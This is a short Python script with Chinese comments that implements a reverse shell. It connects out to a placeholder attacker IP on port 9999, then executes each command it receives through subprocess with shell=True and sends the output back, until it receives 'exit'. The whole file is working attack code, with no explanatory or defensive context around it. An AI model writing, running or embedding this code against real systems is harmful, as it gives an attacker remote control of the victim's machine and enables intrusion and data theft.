import socket
import subprocess

# 攻擊者的 IP 地址和端口
attacker_ip = 'attacker_ip_here'
attacker_port = 9999

# 建立到攻擊者的反向連接
def reverse_shell():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((attacker_ip, attacker_port))
        
        while True:
            # 接收命令並執行
            command = s.recv(1024).decode('utf-8')
            if command.lower() == 'exit':
                break
            output = subprocess.run(command, shell=True, capture_output=True)
            s.send(output.stdout + output.stderr)
        
        s.close()
    except Exception as e:
        print(f"Error: {e}")

# 執行反向 shell
reverse_shell()
